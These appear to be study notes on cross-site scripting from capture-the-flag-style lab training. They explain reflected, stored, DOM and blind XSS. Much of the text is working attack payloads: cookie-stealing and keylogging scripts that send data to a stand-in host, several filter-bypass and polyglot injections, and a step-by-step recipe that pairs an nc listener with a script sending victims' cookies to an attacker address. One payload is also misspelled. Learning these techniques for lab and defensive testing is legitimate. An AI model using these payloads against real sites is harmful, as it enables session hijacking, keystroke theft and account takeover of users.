# Cross-Site Scripting (XSS)
Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

## XSS Payloads 
| Category            | Proof of Concept |
|---------------------|------------------|
| XSS (Basic)         | `<script>alert('XSS');</script>` |
| Session Stealing    | `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` |
| Key Logger          | `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>` |
| Business Logic      | `<script>user.changeEmail('attacker@hacker.thm');</script>` |

# Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

## Impact 
The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

# Stored XSS
As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

## How to test for Stored XSS:
You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
* Comments on a blog
* User profile information
* Website Listings

# DOM Based XSS
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. 
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

# Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

You can use "XSS hunter express" to find blind xss vulnerability.


# Methodology
1. Find any input parameters try the basic xss payload `<script>alert('Hacked');</script>`
2. If first one doesnt work then you can try this `"><script>alert('Hacked');</script>`
3. Next you can try is to close the existing tag from html code and then add the script eg: `</p><script>alert('THM');</script>` here `</p>` is the paragraph closing tag.
4. Enter your name into the form, you'll see it reflected on the page. It looks similar to normal input, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code. To bypass this you need to escape the JS code so we can use the payload `';alert('Hacked');//`
5. Here is the situation where the webiste filters out the `script` word from the actual script, you can use the payload `<sscriptcript>alert('THM');</sscriptcript>`
6. When the website request for images, you can either use `<img src=x inload=alert('HTB');>` OR `<Existing_File_Path>/test.jpg"onload="alert('Hacked');`
7. Use Polygot Pyaload to escape attributes, tags and all filter all in one ``` jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e ```

## Extracting Cookie from website using XSS
1. Find the input field where the xss is reflected
2. run the `nc -lvnp <port_number>` on attacker machine.
3. run and click on the script on website `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>` (replace URL_OR_IP with your attacker informations)
